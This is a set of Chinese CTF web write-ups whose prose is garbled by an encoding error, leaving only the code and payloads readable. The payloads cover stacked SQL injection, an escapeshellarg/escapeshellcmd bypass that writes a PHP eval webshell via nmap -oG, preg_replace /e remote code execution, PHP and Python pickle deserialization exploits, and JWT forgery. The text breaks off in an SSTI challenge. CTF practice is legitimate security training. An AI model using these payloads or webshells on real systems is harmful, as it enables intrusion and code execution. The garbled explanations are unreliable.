é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®ï¼Œå’Œä¸Šé¢˜ä¸€æ ·æ˜¯ä¸€ä¸ªæŸ¥è¯¢æ¡†ï¼Œå¯ä»¥æ‹¿åˆ°æºç ï¼š &lt;?php session_start(); include_once \"config.php\"; $post = array(); $get = array(); global $MysqlLink; //GetPara(); $MysqlLink = mysqli_connect(\"localhost\",$datauser,$datapass); if(!$MysqlLink){ die(\"Mysql Connect Error!\"); } $selectDB = mysqli_select_db($MysqlLink,$dataName); if(!$selectDB){ die(\"Choose Database Error!\"); } foreach ($_POST as $k=&gt;$v){ if(!empty($v)&amp;&amp;is_string($v)){ $post[$k] = trim(addslashes($v)); } } foreach ($_GET as $k=&gt;$v){ } } //die(); ?&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/ a&gt;&lt;form action=\"\" method=\"post\"&gt;&lt;input type=\"text\" name=\"query\"&gt;&lt;input type=\"submit\"&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php if(isset($post['query'])){ $BlackList = \"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\\\"\"; //var_dump(preg_match(\"/{$BlackList}/is\",$post['query'])); if(preg_match(\"/{$BlackList}/is\",$post['query'])){ //echo $post['query']; die(\"Nonono.\"); } if(strlen($post['query'])&gt;40){ die(\"Too long.\"); } $sql = \"select \".$post['query'].\"||flag from Flag\"; mysqli_multi_query($MysqlLink,$sql); do{ if($res = mysqli_store_result($MysqlLink)){ while($row = mysqli_fetch_row($res)){ print_r($row); } } }while(@mysqli_next_result($MysqlLink)); } ?&gt; çœ‹åˆ° mysql_multi_query()å¾—çŸ¥å¯ä»¥å †å æ³¨å…¥ï¼Œè¿™é‡Œå…³æ³¨æŸ¥è¯¢è¯­å¥$sql = &quot;select &quot;.$post['query'].&quot;||flag from Flag&quot;;å¯ä»¥çœ‹åˆ°ï¼ŒæŸ¥è¯¢è¯­å¥æ˜¯å°†æˆ‘ä»¬ä¼ å…¥çš„è¯­å¥ä¸||flag from Flagæ‹¼æ¥åœ¨ä¸€èµ·äº†ï¼Œè¿™é‡Œè¡¥å……çŸ¥è¯†ï¼š åœ¨oracle ç¼ºçœæ”¯æŒ é€šè¿‡ â€˜ || â€™ æ¥å®ç°å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œä½†åœ¨mysql ç¼ºçœä¸æ”¯æŒã€‚éœ€è¦è°ƒæ•´mysql çš„sql_modeæ¨¡å¼ï¼špipes_as_concat æ¥å®ç°oracle çš„ä¸€äº›åŠŸèƒ½ã€‚ å› æ­¤æˆ‘ä»¬é€šè¿‡å †å æ³¨å…¥è®¾ç½®sql_modeï¼Œç„¶åå†æŸ¥è¯¢å³å¯ã€‚ è§£é¢˜æ„é€ æœ€ç»ˆpayloadï¼š1;set sql_mode=PIPES_AS_CONCAT;select 1 éé¢„æœŸè§£ï¼šç›´æ¥æ„é€ payloadä¸º*,1å³å¯æ‹¿åˆ°flag å­—ç¬¦ä¸²æˆ–æ—¶å‰é¢çš„æ•°å­—æ—¶ç»“æœä¸º1åˆ™è¿”å›1ï¼Œä¸º0åˆ™è¿”å›0ï¼Œæ•ˆæœè·Ÿç›´æ¥*ä¸€æ ·ã€‚ [BUUCTF 2018]Online Toolè€ƒå¯Ÿnampçš„ä¸€ä¸ªå‘½ä»¤-oGï¼Œä»¥åŠescapeshellarg()å’Œescapeshellarg()å‡½æ•°åˆèµ·æ¥ä½¿ç”¨é€ æˆçš„æ¼æ´ã€‚ é¢˜ç›®åˆ†æé¦–å…ˆçœ‹åˆ°ä»£ç ï¼š &lt;?phpif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) { $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];}if(!isset($_GET['host'])) { highlight_file(__FILE__);} else { $host = $_GET['host']; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(\"glzjin\". $_SERVER['REMOTE_ADDR']); echo 'you are in sandbox '.$sandbox; @mkdir($sandbox); chdir($sandbox); echo system(\"nmap -T5 -sT -Pn --host-timeout 2 -F \".$host);} æˆ‘ä»¬çœ‹åˆ°ï¼Œä»£ç ä¸»è¦æ˜¯é€šè¿‡åˆ©ç”¨nmapçš„å‘½ä»¤æ‹¼æ¥ä¸Šæˆ‘ä»¬çš„è¾“å…¥æ¥æ‰§è¡Œï¼Œå‚è€ƒåˆ«äººçš„é¢˜è§£å¾—çŸ¥nampçš„ä¸€ä¸ªå‚æ•°-oGå¯ä»¥å‘ç›®æ ‡æœºå™¨ä¸­å†™å…¥æ–‡ä»¶ï¼Œé€šè¿‡è¿™ä¸ªå‚æ•°ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥å‘ç›®æ ‡æœºå™¨å†™å…¥ä¸€ä¸ªå°é©¬æ¥è¿æ¥ã€‚ä½†æ˜¯æˆ‘ä»¬åªèƒ½ä»hostå‚æ•°æ¥å†™å…¥å†…å®¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å†™å…¥çš„å°é©¬ä»£ç ä¾¿ä¼šè¢«escapeshellarg()å’Œescapeshellarg()åšå¤„ç†ï¼Œå³å°†hostä¸­åŒ…å«çš„å­—ç¬¦è½¬ä¹‰ï¼Œä¾¿å¯ä»¥å½±å“å°é©¬çš„ä¸Šä¼ ï¼Œå› æ­¤éœ€è¦åˆ©ç”¨å®ƒä»¬ç»“åˆä½¿ç”¨å­˜åœ¨çš„æ¼æ´æ¥ç»•è¿‡ã€‚è¿™é‡Œå¯ä»¥å‚è€ƒï¼šhttps://paper.seebug.org/164/å³ä¼ å…¥çš„å‚æ•°å†…å®¹ä¸­åŒ…å«'åˆ™ä¼šé€ æˆæ¼æ´ï¼Œä¾‹å¦‚ï¼š ä¼ å…¥çš„å‚æ•°æ˜¯ï¼š172.17.0.2' -v -d a=1 ç»è¿‡escapeshellargå¤„ç†åå˜æˆäº†'172.17.0.2'\\'' -v -d a=1'ï¼Œå³å…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ã€‚ ç»è¿‡escapeshellcmdå¤„ç†åå˜æˆ'172.17.0.2'\\\\'' -v -d a=1\\'ï¼Œè¿™æ˜¯å› ä¸ºescapeshellcmdå¯¹\\ä»¥åŠæœ€åé‚£ä¸ªä¸é…å¯¹å„¿çš„'è¿›è¡Œäº†è½¬ä¹‰ æœ€åæ‰§è¡Œçš„å‘½ä»¤æ˜¯curl '172.17.0.2'\\\\'' -v -d a=1\\'ï¼Œç”±äºä¸­é—´çš„\\\\è¢«è§£é‡Šä¸º\\è€Œä¸å†æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥åé¢çš„'æ²¡æœ‰è¢«è½¬ä¹‰ï¼Œä¸å†åé¢çš„'é…å¯¹å„¿æˆäº†ä¸€ä¸ªç©ºç™½è¿æ¥ç¬¦ã€‚æ‰€ä»¥å¯ä»¥ç®€åŒ–ä¸ºcurl 172.17.0.2\\ -v -d a=1'ï¼Œå³å‘172.17.0.2\\å‘èµ·è¯·æ±‚ï¼ŒPOSTæ•°æ®ä¸ºa=1'ã€‚ è¿™é‡Œæˆ‘ä»¬æ˜¯åˆ©ç”¨nampæ‰§è¡Œå‘½ä»¤ï¼Œé‚£ä¹ˆéœ€è¦äº†è§£ä¸€äº›nampçš„åŸºæœ¬çŸ¥è¯†ï¼šnamp -PS 127.0.0.1ä¸namp -PS '' 127.0.0.1ä¸nmap -PS '&quot; &quot;' 127.0.0.1 &quot; &quot;æ•ˆæœæ˜¯ä¸€æ ·çš„ã€‚ è§£é¢˜æ„é€ payloadï¼š ?host=' &lt;?php @eval($_POST[\"hack\"]);?&gt; -oG hack.php ' å†™å…¥ä¹‹åè¿”å›äº†å°é©¬å­˜å‚¨çš„è·¯å¾„ï¼šç„¶åå»èšå‰‘è¿æ¥å³å¯ã€‚ [ZJCTF 2019]NiZhuanSiWeiè€ƒå¯Ÿfile_get_contentsçš„ç»•è¿‡ï¼Œä»¥åŠååºåˆ—åŒ–ã€‚è¡¥å……çŸ¥è¯†ï¼šfile_get_contentsçš„ç»•è¿‡ 1ã€ä½¿ç”¨php://inputä¼ªåè®®ç»•è¿‡ â‘ å°†è¦GETçš„å‚æ•°?xxx=php://input â‘¡ç”¨postæ–¹æ³•ä¼ å…¥æƒ³è¦file_get_contents()å‡½æ•°è¿”å›çš„å€¼2ã€ç”¨data://ä¼ªåè®®ç»•è¿‡ â‘ å°†urlæ”¹ä¸ºï¼š?xxx=data://text/plain;base64,æƒ³è¦file_get_contents()å‡½æ•°è¿”å›çš„å€¼çš„base64ç¼–ç  â‘¡æˆ–è€…å°†urlæ”¹ä¸ºï¼š?xxx=data:text/plain,(urlç¼–ç çš„å†…å®¹)3ã€åˆ©ç”¨è¿œç¨‹æ–‡ä»¶è¯»å–ç»•è¿‡ é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®ä¹‹åï¼Œç»™å‡ºäº†ä¸€æ®µä»£ç ï¼š &lt;?php $text = $_GET[\"text\"];$file = $_GET[\"file\"];$password = $_GET[\"password\"];if(isset($text)&amp;&amp;(file_get_contents($text,'r')===\"welcome to the zjctf\")){ echo \"&lt;br&gt;&lt;h1&gt;\".file_get_contents($text,'r').\"&lt;/h1&gt;&lt;/br&gt;\"; if(preg_match(\"/flag/\",$file)){ echo \"Not now!\"; exit(); }else{ include($file); //useless.php $password = unserialize($password); echo $password; }}else{ highlight_file(__FILE__);}?&gt; é€šè¿‡å®¡è®¡ä»£ç å¯çŸ¥ï¼šéœ€è¦GETæ–¹å¼ä¸Šä¼ ä¸‰ä¸ªå‚æ•°textã€fileã€passwordï¼Œå¹¶ä¸”ä¸‰ä¸ªå‚æ•°éœ€è¦æ»¡è¶³ï¼š textå‚æ•°ä¼ å…¥çš„å€¼ä¼šç”¨file_get_contentså»è®¿é—®ï¼Œåˆæ­¥çŒœæµ‹æ˜¯è¿œç¨‹æ–‡ä»¶è¯»å–ï¼Œåæ¥æµ‹è¯•å‘ç°è¿™é‡Œä¸è¡Œï¼Œéœ€è¦ç”¨ä¼ªåè®®ï¼› fileå‚æ•°å¯ä»¥ä¼ å…¥æ–‡ä»¶åï¼Œè¿™ä¸ªæ–‡ä»¶ä¼šè¢«include()åŒ…å«ï¼Œçœ‹åˆ°è¿™çŒœæµ‹è‚¯å®šæœ‰æ–‡ä»¶åŒ…å«ï¼Œå¹¶ä¸”æç¤ºäº†useless.phpï¼Œè‚¯å®šæ˜¯è¦çœ‹å®ƒçš„ä»£ç çš„ï¼› passwordä¼šè¿›è¡Œååºåˆ—åŒ–ï¼Œè¿˜æ²¡çœ‹å‡ºä»–çš„ç”¨å¤„ã€‚ è§£é¢˜é¦–å…ˆæ„é€ payloadï¼š /?text=data:text/plain,welcome to the zjctf&amp;file=php://filter/convert.base64-encode/resource=useless.php&amp;passwprd=1 æˆåŠŸè¯»å–åˆ°useless.phpçš„ä»£ç ï¼Œå¦‚ä¸‹ï¼š &lt;?php class Flag{ //flag.php public $file; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo \"&lt;br&gt;\"; return (\"U R SO CLOSE !///COME ON PLZ\"); } } } ?&gt; æˆ‘ä»¬çœ‹åˆ°ï¼Œè¿™é‡Œæ„é€ äº†ä¸€ä¸ªFlagç±»ï¼Œå¹¶ä¸”åœ¨æ­¤å¤„å¯ä»¥è¯»åˆ°flag.phpçš„å†…å®¹ï¼Œç”±æ­¤å¾—çŸ¥passwordä¼ å…¥çš„è‚¯å®šæ˜¯æ­¤å¤„åºåˆ—åŒ–çš„å†…å®¹ï¼Œå¯ä»¥ç”¨ä¸‹é¢çš„ä»£ç æ‹¿åˆ°åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼š &lt;?php class Flag{ //flag.php public $file = \"flag.php\"; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo \"&lt;br&gt;\"; return (\"U R SO CLOSE !///COME ON PLZ\"); } } } $a = new Flag;echo serialize($a);?&gt; O:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";} ç„¶åå†æ„é€ payloadè¯»å–flagï¼š /?text=data:text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";} æŸ¥çœ‹æºç æ‹¿åˆ°flagã€‚ [BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤æ˜¯ä¸Šé“é¢˜çš„æ”¹ç‰ˆï¼ŒåŸé¢˜æ˜¯æ”¯æŒè¿œç¨‹æ–‡ä»¶è¯»å–çš„ï¼Œä½†æ˜¯æ”¾åˆ°BUUä¸Šå¥½åƒä¸è¡Œäº†â€¦ è¿™é“é¢˜åœ¨ä¸Šé“é¢˜çš„åŸºç¡€ä¸Šè€ƒäº†preg_replace()çš„RCEã€‚æœ¬RCEå‚è€ƒï¼šhttps://xz.aliyun.com/t/2557 é¢˜ç›®åˆ†æé¦–å…ˆçœ‹ä»£ç ï¼š &lt;?phperror_reporting(0);$text = $_GET[\"text\"];$file = $_GET[\"file\"];if(isset($text)&amp;&amp;(file_get_contents($text,'r')===\"I have a dream\")){ echo \"&lt;br&gt;&lt;h1&gt;\".file_get_contents($text,'r').\"&lt;/h1&gt;&lt;/br&gt;\"; if(preg_match(\"/flag/\",$file)){ die(\"Not now!\"); } include($file); //next.php }else{ highlight_file(__FILE__);}?&gt; ç›¸åŒçš„æ“ä½œæ‹¿åˆ°next.phpçš„æºç ï¼š &lt;?php$id = $_GET['id'];$_SESSION['id'] = $id;function complex($re, $str) { return preg_replace( '/(' . $re . ')/ei', 'strtolower(\"\\\\1\")', $str );}foreach($_GET as $re =&gt; $str) { echo complex($re, $str). \"\\n\";}function getFlag(){ @eval($_GET['cmd']);} è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°è¯­å¥preg_replace('/(' . $re . ')/ei','strtolower(&quot;\\\\1&quot;)',$str)ä¸­é‡‡ç”¨äº†preg_replace/eæ¨¡å¼ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨ä¸Šé¢æåˆ°çš„RCEæ¥å†™å…¥å°é©¬ï¼Œæ„é€ payloadå¦‚ä¸‹ï¼š /next.php?id=1&amp;\\S*=${eval($_POST[x])} è¿™æ ·æ„é€ çš„åŸå› ï¼š preg_replaceå‡½æ•°åœ¨åŒ¹é…åˆ°ç¬¦å·æ­£åˆ™çš„å­—ç¬¦ä¸²æ—¶ï¼Œä¼šå°†æ›¿æ¢å­—ç¬¦ä¸²ï¼ˆä¹Ÿå°±æ˜¯ä¸Šå›¾preg_replaceå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ï¼‰å½“åšä»£ç æ¥æ‰§è¡Œï¼Œç„¶è€Œè¿™é‡Œçš„ç¬¬äºŒä¸ªå‚æ•°å´å›ºå®šä¸º'strtolower(&quot;\\\\1&quot;)'å­—ç¬¦ä¸²ï¼Œå°±éœ€è¦æƒ³åŠæ³•æ¥æ‰§è¡Œå®ƒã€‚ ä¸Šé¢çš„å‘½ä»¤æ‰§è¡Œï¼Œç›¸å½“äºeval('strtolower(&quot;\\\\1&quot;);')ç»“æœï¼Œå½“ä¸­çš„\\\\1å®é™…ä¸Šå°±æ˜¯\\1ï¼Œè€Œ\\1åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­æœ‰è‡ªå·±çš„å«ä¹‰ï¼š å¯¹ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼æˆ–éƒ¨åˆ†æ¨¡å¼ä¸¤è¾¹æ·»åŠ åœ†æ‹¬å·å°†å¯¼è‡´ç›¸å…³åŒ¹é…å­˜å‚¨åˆ°ä¸€ä¸ªä¸´æ—¶ç¼“å†²åŒºä¸­ï¼Œæ‰€æ•è·çš„æ¯ä¸ªå­åŒ¹é…éƒ½æŒ‰ç…§åœ¨æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¸­ä»å·¦åˆ°å³å‡ºç°çš„é¡ºåºå­˜å‚¨ã€‚ç¼“å†²åŒºç¼–å·ä»1å¼€å§‹ï¼Œæœ€å¤šå¯å­˜å‚¨99ä¸ªæ•è·çš„å­è¡¨è¾¾å¼ã€‚æ¯ä¸ªç¼“å†²åŒºéƒ½å¯ä»¥ä½¿ç”¨'\\n'è®¿é—®ï¼Œå…¶ä¸­nä¸ºä¸€ä¸ªæ ‡è¯†ç‰¹å®šç¼“å†²åŒºçš„ä¸€ä½æˆ–ä¸¤ä½åè¿›åˆ¶æ•°ã€‚ æ‰€ä»¥è¿™é‡Œçš„\\1å®é™…ä¸ŠæŒ‡å®šçš„æ˜¯ç¬¬ä¸€ä¸ªå­åŒ¹é…é¡¹ï¼Œå‚è€ƒå‰é¢çš„é“¾æ¥ï¼Œæˆ‘ä»¬ä¼ å…¥\\S*=${eval($_POST[x])}ä¾¿å¯ä»¥å°†å°é©¬å†™å…¥(SåŸæœ¬æ˜¯.ï¼Œä½†æ˜¯ä¼ å‚æ•°é¦–å­—ç¬¦æ˜¯ç‰¹æ®Šå­—ç¬¦çš„æ—¶å€™ä¼šè¢«æ›¿æ¢ä¸º_ï¼Œç”¨Så¯ä»¥ç»•è¿‡)ã€‚ è§£é¢˜ç”¨ä¸Šé¢çš„payloadå†™å…¥å°é©¬ï¼Œç„¶åç”¨èšå‰‘è¿æ¥æ‹¿åˆ°shellï¼Œå³å¯æ‹¿åˆ°flagã€‚æ³¨æ„è¿™é‡Œæˆ‘ä»¬å¹¶æ²¡æœ‰æŠŠä¸Šé¢çš„è¯­å¥å†™å…¥åˆ°æŒ‡å®šçš„æ–‡ä»¶ï¼Œè€Œæ˜¯è®¿é—®çš„æ—¶å€™${eval($_POST[x])}è¯­å¥é¦–å…ˆè¢«æ‰§è¡Œäº†ï¼Œå› æ­¤æ‰å¯ä»¥è¿æ¥ä¸Šï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿æ¥çš„æ—¶å€™ç”¨çš„ä¹Ÿå°±æ˜¯æ•´ä¸ªurläº†ã€‚ [æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlagè€ƒå¯Ÿis_numeric()å’Œstrcmp()ä¸¤ä¸ªå‡½æ•°çš„æ¼æ´ è¡¥å……çŸ¥è¯† phpä¸­çš„strcmpæ¼æ´ ä¼ å…¥çš„æœŸæœ›ç±»å‹æ˜¯å­—ç¬¦ä¸²ç±»å‹çš„æ•°æ®ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬ä¼ å…¥éå­—ç¬¦ä¸²ç±»å‹çš„æ•°æ®çš„æ—¶å€™ï¼Œè¿™ä¸ªå‡½æ•°æ¥å—åˆ°äº†ä¸ç¬¦åˆçš„ç±»å‹å°†å‘ç”Ÿé”™è¯¯ï¼Œä½†æ˜¯åœ¨5.3ä¹‹å‰çš„phpä¸­ï¼Œæ˜¾ç¤ºäº†æŠ¥é”™çš„è­¦å‘Šä¿¡æ¯åï¼Œä»å°†return 0ï¼ˆè¡¨ç¤ºä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰ï¼‰ã€‚é‚£ä¹ˆåˆ©ç”¨æ•°ç»„å³å¯ç»•è¿‡åˆ¤æ–­ã€‚ phpä¸­çš„is_numeric()æ¼æ´ is_numericå‡½æ•°å¯¹äºç©ºå­—ç¬¦%00ï¼Œæ— è®ºæ˜¯%00æ”¾åœ¨å‰åéƒ½å¯ä»¥åˆ¤æ–­ä¸ºéæ•°å€¼ï¼Œè€Œ%20ç©ºæ ¼å­—ç¬¦åªèƒ½æ”¾åœ¨æ•°å€¼åã€‚æ‰€ä»¥ï¼ŒæŸ¥çœ‹å‡½æ•°å‘ç°è¯¥å‡½æ•°å¯¹å¯¹äºç¬¬ä¸€ä¸ªç©ºæ ¼å­—ç¬¦ä¼šè·³è¿‡ç©ºæ ¼å­—ç¬¦åˆ¤æ–­ï¼Œæ¥ç€åé¢çš„åˆ¤æ–­ã€‚ é¢˜ç›®åˆ†æåœ¨PAYFLAGé¡µé¢æºç ä¸­å‘ç°å¦‚ä¸‹ä»£ç ï¼š ~~~post money and password~~~if (isset($_POST['password'])) { $password = $_POST['password']; if (is_numeric($password)) { echo \"password can't be number&lt;/br&gt;\"; }elseif ($password == 404) { echo \"Password Right!&lt;/br&gt;\"; } æç¤ºæˆ‘ä»¬ä¼ å…¥moneyå’Œpasswordï¼Œå¯ä»¥çœ‹åˆ°åˆ©ç”¨password=404%20å³å¯ç»•è¿‡is_numericçš„åˆ¤æ–­ã€‚æŠ“åŒ…å‘ç°cookieå€¼ä¸º0ï¼Œè€Œå¹¶æ²¡æœ‰é‡‡ç”¨PHPSESSIDï¼Œå°†å…¶æ”¹ä¸º1å³å¯ï¼Œå‘é€ä¹‹åå›æ˜¾å¦‚ä¸‹ï¼šä»ä¸­çœ‹åˆ°äº†å¯¹moneyçš„åˆ¤æ–­ï¼Œçœ‹åˆ°PHPç‰ˆæœ¬æ˜¯5.3çš„ï¼ŒçŒœæµ‹æ˜¯strcmpå‡½æ•°æ¯”è¾ƒçš„ï¼Œåˆ©ç”¨æ•°ç»„ç»•è¿‡å³å¯ã€‚æˆåŠŸæ‹¿åˆ°flagã€‚**å…¶å®å¯¹äºmoneyçš„ç»•è¿‡è¿˜å¯ä»¥é‡‡ç”¨ç§‘å­¦è®¡æ•°æ³•money=1e11ã€‚ [CISCN 2019]ikunè€ƒå¯Ÿè–…ç¾Šæ¯›é€»è¾‘æ¼æ´ï¼šé€šè¿‡æŠ“åŒ…ä¿®æ”¹æŠ˜æ‰£ç­‰æ•°æ®æ¥è´­ä¹°flagï¼›jwt-cookiesä¼ªé€ ã€pythonååºåˆ—åŒ– é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®ä¹‹åæç¤ºè¦ä¹°åˆ°lv6æˆ‘ä»¬çœ‹åˆ°æ¯ä¸ªå•†å“éƒ½æœ‰ä¸ªç­‰çº§çš„æ ‡ç­¾ï¼ŒæŸ¥çœ‹æ ‡ç­¾å‘½åæ˜¯lvx.pngï¼Œå› æ­¤è‹¥è¦æ‰¾åˆ°lv6çš„åœ°æ–¹ï¼Œå¯ä»¥ç”¨ä¸‹é¢çš„è„šæœ¬ä»£ç ï¼š import requestsurl=\"http://6e7db183-764d-4afc-bdbb-b70791536e4a.node3.buuoj.cn/shop?page=\"for i in range(0,2000): r=requests.get(url+str(i)) if 'lv6.png' in r.text: print (i) break è·‘å‡ºæ¥lv6åœ¨181é¡µï¼Œä½†æ˜¯å‘ç°å¤ªè´µäº†â€¦æŠ“åŒ…å‘ç°å¯ä»¥è®¾ç½®æŠ˜æ‰£ï¼Œè¿™é‡Œå°±ç”¨åˆ°äº†è–…ç¾Šæ¯›é€»è¾‘æ¼æ´ã€‚ç„¶åé¡µé¢è¿”å›æç¤ºéœ€è¦æ˜¯adminæŠ“åŒ…å‘ç°cookieé‡‡ç”¨äº†JWT(æ­¤å¤„å¯äº†è§£JWT)ï¼Œæˆ‘ä»¬æŠŠJWTæ‹¿å»base64è§£ç å¾—åˆ° {\"alg\":\"HS256\",\"typ\":\"JWT\"}{\"username\":\"123\"}Â¶Â«Â”L=Âœ\u0003\u001fm\u001aÃ°Â¢Ã–Ã™ÂŸJh\u000fÃ\u001aÃ¶7Ã‰q\"&gt;[Â‡Â¿ å…¶ä¸­usernameä¸­æ˜¯æˆ‘ä»¬ç™»å½•çš„ç”¨æˆ·åï¼Œç­‰ä¸‹ä¼ªé€ JWTæ—¶æ”¹ä¸ºadminå³å¯ï¼›å¦å¤–ï¼Œä¼ªé€ JWTè¿˜éœ€è¦ç§˜é’¥ï¼Œå¯ä»¥åˆ©ç”¨c-jwt-crackeræ¥ç ´è§£ï¼šæ‹¿åˆ°ç§˜é’¥ä¹‹åï¼Œåˆ°JWTç”Ÿæˆç½‘ç«™ä¼ªé€ adminçš„JWTï¼šæ‹¿ä¼ªé€ çš„JWTä¼ªè£…æˆç®¡ç†å‘˜ï¼Œç„¶åå¾—åˆ°äº†ä¸€ä¸ªå‹ç¼©åŒ…çš„åœ°å€ï¼š ç„¶åéœ€è¦æˆä¸ºå¤§ä¼šå‘˜ï¼ŒBPæŠ“åŒ…å‘ç°æ˜¯åˆ©ç”¨becomeä¼ å‚ï¼Œåœ¨æºç çš„Admin.pyä¸­æ‰¾åˆ°äº†è¿™ä¸ªå‚æ•°ï¼š def post(self, *args, **kwargs): try: become = self.get_argument('become') p = pickle.loads(urllib.unquote(become)) return self.render('form.html', res=p, member=1) except: return self.render('form.html', res='This is Black Technology!', member=0) æˆ‘ä»¬çœ‹åˆ°ï¼Œè¿™ä¸ªåœ°æ–¹åˆ©ç”¨äº†pickle.loadså¯¹becomeä¼ å‚è¿›è¡Œååºåˆ—åŒ–(å…³äºpickle)ï¼Œç°åœ¨å°±éœ€è¦æ„é€ å¯è¯»å–flagæ–‡ä»¶çš„åºåˆ—åŒ–å­—ç¬¦ä¸²èµ‹ç»™becomeåˆ©ç”¨Pythonååºåˆ—åŒ–çš„æ¼æ´æ‹¿åˆ°flagã€‚ è§£é¢˜ä»å›¾ä¸­çœ‹åˆ°ï¼šæˆ‘ä»¬å¯ä»¥åˆ©ç”¨reduceï¼Œå½“reduceè¢«å®šä¹‰ä¹‹åï¼Œè¯¥å¯¹è±¡è¢«Pickleæ—¶å°±ä¼šè¢«è°ƒç”¨æˆ‘ä»¬è¿™é‡Œçš„evalç”¨äºé‡å»ºå¯¹è±¡çš„æ—¶å€™è°ƒç”¨ï¼Œå³å‘Šè¯‰pythonå¦‚ä½•pickleä»–ä»¬ä¾›evalä½¿ç”¨çš„å³æ‰“å¼€çš„æ–‡ä»¶flag.txtï¼ŒEXPå¦‚ä¸‹ï¼š #python3import picklefrom urllib import parseclass payload(object): def __reduce__(self): return (eval, (\"open('/flag.txt','r').read()\",))a = pickle.dumps(payload())a = parse.quote(a)print (a)#python2import pickleimport urllibclass payload(object): def __reduce__(self): return (eval, (\"open('/flag.txt','r').read()\",))a = pickle.dumps(payload())a = urllib.quote(a)print a ç”Ÿæˆpayloadï¼š c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A. åˆ©ç”¨å‰é¢ä¼ªé€ çš„JWTåŒæ—¶å°†ä¸Šé¢çš„payloadä¼ ç»™å‚æ•°becomeå³å¯æ‹¿åˆ°flagã€‚å…³äºPythonååºåˆ—åŒ–æ¼æ´çš„å‚è€ƒï¼šPickleååºåˆ—åŒ–æ¼æ´ï¼šhttps://xz.aliyun.com/t/2289cPickleååºåˆ—åŒ–æ¼æ´ï¼šhttps://blog.csdn.net/SKI_12/article/details/85015803Python-secçš„ä¸€äº›æ€»ç»“ï¼šhttp://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/ [ASIS 2019]Unicorn shopè€ƒå¯Ÿunicodeå®‰å…¨é—®é¢˜ï¼Œå‚è€ƒå¦‚ä¸‹é“¾æ¥ï¼šæµ…è°ˆUnicodeè®¾è®¡çš„å®‰å…¨æ€§Unicodeç­‰ä»·æ€§æµ…è°ˆUNICODE SECURITY CONSIDERATIONS è§£é¢˜æŸ¥çœ‹æºç å‘ç°åœ¨charset=UTF-8å¤„æç¤ºAh,really important,seriously.ï¼Œè¯´æ˜æ˜¯è€ƒå¯Ÿä¸unicodeå®‰å…¨ç›¸å…³çš„çŸ¥è¯†ï¼Œå†çœ‹é¢˜ç›®é¡µé¢ï¼Œå¯ä»¥ä¹°å››ç§ç‹¬è§’å…½ï¼Œä½†æ˜¯å‰ä¸‰ç§ä»·æ ¼éƒ½æ˜¯ä¸€ä½æ•°ï¼Œè€Œç¬¬å››ä¸ªå´æ˜¯å››ä½æ•°ï¼ŒçŒœæµ‹flagå°±åœ¨ç¬¬å››ä¸ªã€‚ä½†æ˜¯è¾“å…¥æ¡†åªèƒ½è¾“å…¥ä¸€ä¸ªå­—ç¬¦ï¼Œå‚è€ƒç½‘ä¸Šçš„èµ„æ–™ï¼Œåˆ°å‰é¢çš„ç½‘ç«™æ‰¾ä¸€ä¸ªå¤§äº1337çš„ç‰¹æ®Šunicodeå­—ç¬¦ï¼Œç„¶åå°†å…¶è¿›è¡Œurlç¼–ç å¡«å…¥è¾“å…¥æ¡†æ‹¿åˆ°flagã€‚å¯ä»¥å»è¿™é‡Œæ‰¾ã€‚ [WesternCTF 2018]shrineè€ƒå¯ŸSSTIæœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼Œå‚è€ƒhttps://www.cnblogs.com/wangtanzhi/p/12238779.html é¢˜ç›®åˆ†æimport flaskimport osapp = flask.Flask(__name__)app.config['FLAG'] = os.environ.pop('FLAG')@app.route('/')def index(): return open(__file__).read()@app.route('/shrine/&lt;path:shrine&gt;')def shrine(shrine): def safe_jinja(s): s = s.replace('(', '').replace(')', '') blacklist = ['config', 'self'] return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine))if __name__ == '__main__': app.run(debug=True) 